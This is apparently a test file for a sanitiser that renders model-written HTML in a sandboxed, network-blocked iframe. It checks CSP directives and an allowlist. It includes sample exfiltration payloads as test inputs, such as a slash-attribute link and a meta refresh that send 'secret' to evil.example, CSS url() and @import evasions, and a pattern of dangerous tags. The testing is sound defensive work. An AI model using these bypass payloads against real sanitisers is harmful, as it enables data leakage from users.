import assert from "node:assert/strict";
import { test } from "node:test";
import { DOMParser } from "linkedom";
import { FRAME_CSP, type HtmlParser, VIEW_CSP, VIEW_SANDBOX, sanitizeCss, sanitizeHtml, viewDocument, viewPage } from "../src/sandbox.ts";
import { hostileCases } from "./hostile.ts";

// The page uses the browser's parser; here a small DOM stands in for it.
// Unlike a browser, it only builds <html> and <body> when the markup has them.
const parse: HtmlParser = (html) =>
  new DOMParser().parseFromString(/^\s*(<!doctype|<html)/i.test(html) ? html : `<html><head></head><body>${html}</body></html>`, "text/html") as unknown as Document;
const LEAK = "http://leak.test";
const TLS = "https://tls.test";

test("the iframe sandbox never allows same-origin or scripts", () => {
  assert.ok(!VIEW_SANDBOX.includes("allow-same-origin"));
  assert.ok(!VIEW_SANDBOX.includes("allow-scripts"));
});

test("the policy blocks every network request", () => {
  for (const directive of ["default-src 'none'", "connect-src 'none'", "script-src 'none'", "img-src data:", "form-action 'none'", "frame-src 'none'", "base-uri 'none'"]) {
    assert.ok(VIEW_CSP.includes(directive), directive);
  }
  assert.ok(!/https?:|\*/.test(VIEW_CSP));
});

test("egg's policy comes before anything the model wrote", () => {
  const doc = viewPage("html", '<html><head><meta http-equiv="Content-Security-Policy" content="default-src *"></head><body>hi</body></html>', undefined, parse);
  const ours = doc.indexOf(VIEW_CSP);
  assert.ok(ours > 0 && ours < doc.indexOf("hi"));
  assert.ok(!doc.includes("default-src *"), "a looser policy from the model is taken out");
});

test("the view sits inside egg's own frame, whose policy forbids frames from navigating", () => {
  assert.ok(FRAME_CSP.includes("frame-src 'none'") && FRAME_CSP.includes("default-src 'none'"));
  const doc = viewDocument("html", "<p>inner &amp; text</p>", undefined, parse);
  assert.ok(doc.indexOf(FRAME_CSP) > 0 && doc.indexOf(FRAME_CSP) < doc.indexOf("<iframe"));
  const outer = parse(doc);
  const frames = outer.querySelectorAll("iframe");
  assert.equal(frames.length, 1);
  assert.equal(frames[0]!.getAttribute("sandbox"), VIEW_SANDBOX);
  const inner = frames[0]!.getAttribute("srcdoc")!;
  assert.ok(inner.includes(VIEW_CSP) && inner.includes("<p>inner &amp; text</p>"), inner);
});

const ADDRESS = /leak\.test|tls\.test/;

/** Re-parse what the sanitiser wrote, as the frame will, and look for any way out. */
function assertNoWayOut(out: string, label: string) {
  const doc = parse(`<!doctype html><html><head></head><body>${out}</body></html>`);
  for (const el of Array.from(doc.querySelectorAll("*"))) {
    const name = el.localName.toLowerCase();
    assert.ok(!/^(meta|link|base|script|iframe|frame|object|embed|form|input|button|area|map|image|use|template|textarea|video|audio|source|foreignobject)$/.test(name), `${label}: <${name}> survived in ${out}`);
    for (const attr of Array.from(el.attributes)) {
      const a = attr.name.toLowerCase();
      assert.ok(!a.startsWith("on") && !a.includes(":"), `${label}: ${a} survived`);
      assert.ok(!/^(href|src|srcset|action|formaction|poster|ping|data|background|usemap|target)$/.test(a) || (a === "src" && attr.value.startsWith("data:image/")), `${label}: ${a}="${attr.value}" survived`);
      if (a !== "title") assert.ok(!ADDRESS.test(attr.value) || /egg-blocked\(/.test(attr.value), `${label}: an address survived in ${a}="${attr.value}"`);
    }
    if (name === "style") {
      const css = el.textContent ?? "";
      assert.ok(!/@import/i.test(css), `${label}: @import survived: ${css}`);
      assert.ok(!/(^|[^a-z-])url\(\s*["']?(?!data:|#)/i.test(css), `${label}: a url() survived: ${css}`);
    }
  }
}

for (const c of hostileCases(LEAK, TLS)) {
  test(`hostile view: ${c.name}`, () => {
    const out = sanitizeHtml(c.html, parse);
    assertNoWayOut(out, c.name);
    // Also as a whole page with the case in its head.
    assertNoWayOut(sanitizeHtml(`<html><head>${c.html}</head><body>${c.html}</body></html>`, parse), `${c.name} (in head)`);
  });
}

test("the two observed bypasses are closed", () => {
  const slash = sanitizeHtml('<a/href="https://evil.example/?q=secret">click</a>', parse);
  assert.equal(slash, '<a title="https://evil.example/?q=secret">click</a>');
  const meta = sanitizeHtml('<meta name=">" http-equiv="refresh" content="0;url=https://evil.example/?q=secret"><p>x</p>', parse);
  assert.equal(meta, "<p>x</p>");
});

test("CSS cannot fetch", () => {
  assert.ok(sanitizeCss("a{background:url(https://e.test/x)}").includes("egg-blocked(https://e.test/x)"));
  assert.ok(sanitizeCss('a{background:URL( "https://e.test/x")}').includes("egg-blocked("));
  assert.ok(sanitizeCss("a{background:u\\72 l(https://e.test/x)}").includes("egg-blocked("));
  assert.ok(sanitizeCss("a{background:u\\rl(https://e.test/x)}").includes("egg-blocked("));
  assert.ok(sanitizeCss("a{background:ur/**/l(https://e.test/x)}").includes("ur l("), "a comment splits the name, so it is no function");
  assert.ok(sanitizeCss('a{background:image-set("https://e.test/x" 1x)}').includes("egg-blocked("));
  assert.ok(!/@import/i.test(sanitizeCss('@import "x.css"; @IMPORT url(y); @\\69mport "z";')));
  assert.equal(sanitizeCss("a{background:url(data:image/png;base64,AA)}"), "a{background:url(data:image/png;base64,AA)}");
  assert.equal(sanitizeCss("rect{fill:url(#g)}"), "rect{fill:url(#g)}");
  assert.ok(!sanitizeCss('p::after{content:"</style><a href=x>"}</style>').includes("<"));
  assert.equal(sanitizeCss('p::after{content:"\\2192  next"}'), 'p::after{content:"\\2192  next"}', "escapes inside strings stay");
});

test("an ordinary view comes through the allowlist intact", () => {
  const view = `<html><head><style>table{border-collapse:collapse} td{padding:4px}</style></head><body>
<h1 class="t" style="color:#333">Report</h1>
<table border="1"><thead><tr><th scope="col">a</th><th colspan="2">b</th></tr></thead><tbody><tr><td rowspan="2">1</td><td>2</td><td>3</td></tr></tbody></table>
<ul><li>one</li><li><strong>two</strong> &amp; <code>x &lt; y</code></li></ul>
<details open><summary>more</summary><p>hidden</p></details>
<svg viewBox="0 0 100 50" width="100" height="50"><defs><linearGradient id="g" x1="0" x2="1"><stop offset="0" stop-color="red"/><stop offset="1" stop-color="blue"/></linearGradient></defs><rect x="0" y="0" width="100" height="50" fill="url(#g)"/><path d="M0 0L100 50" stroke="black" stroke-width="2"/><text x="10" y="30" text-anchor="start">label</text></svg>
<img src="data:image/png;base64,AAAA" alt="pic" width="10"><p>Read <a href="https://example.com/docs">the docs</a>.</p>
</body></html>`;
  const out = sanitizeHtml(view, parse);
  for (const part of [
    "<style>table{border-collapse:collapse} td{padding:4px}</style>",
    '<h1 class="t" style="color:#333">Report</h1>',
    '<table border="1">',
    '<th scope="col">a</th><th colspan="2">b</th>',
    '<td rowspan="2">1</td>',
    "<li><strong>two</strong> &amp; <code>x &lt; y</code></li>",
    '<details open="">',
    "<summary>more</summary>",
    '<svg viewBox="0 0 100 50" width="100" height="50">',
    '<linearGradient id="g" x1="0" x2="1"><stop offset="0" stop-color="red"></stop>',
    'fill="url(#g)"',
    '<path d="M0 0L100 50" stroke="black" stroke-width="2"></path>',
    '<text x="10" y="30" text-anchor="start">label</text>',
    '<img src="data:image/png;base64,AAAA" alt="pic" width="10">',
    '<a title="https://example.com/docs">the docs</a>',
  ]) {
    assert.ok(out.includes(part), `missing ${part} in ${out}`);
  }
});

test("text views are escaped", () => {
  const doc = viewPage("text", "<script>alert(1)</script> & co");
  assert.ok(doc.includes("&lt;script&gt;alert(1)&lt;/script&gt; &amp; co"));
});

test("HTML views get a plain light page; text views follow bb's theme", () => {
  const dark = { background: "rgb(20, 20, 20)", foreground: "rgb(230, 230, 230)", muted: "gray", border: "gray", font: "Inter", mono: "Menlo", scheme: "dark" as const };
  assert.ok(viewPage("html", "<p>x</p>", dark, parse).includes("background:#ffffff"));
  assert.ok(viewPage("text", "x", dark).includes("background:rgb(20, 20, 20)"));
});
